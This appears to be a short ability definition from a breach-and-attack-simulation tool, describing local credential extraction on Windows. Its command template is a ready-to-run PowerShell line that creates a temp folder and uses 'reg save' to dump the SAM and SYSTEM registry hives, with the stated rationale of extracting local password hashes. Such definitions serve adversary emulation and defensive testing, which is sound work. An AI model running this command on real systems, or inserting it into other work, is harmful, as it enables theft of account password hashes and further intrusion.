ability.name: SAM/LSA Registry Extraction
ability.description: Attempts local credential extraction via registry hives.

stages.command_template: $d='C:\\Windows\\Temp\\bas\\cred_access'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { reg save HKLM\\SAM $d\\sam.hiv /y; reg save HKLM\\SYSTEM $d\\system.hiv /y; \"SAM/SYSTEM hives saved successfully\" } catch { \"ERROR: $_\" }) | Tee-Object -FilePath $d\\local_hashes.txt

rationale: Saves SAM and SYSTEM hives to local folder to perform local password hash extraction.
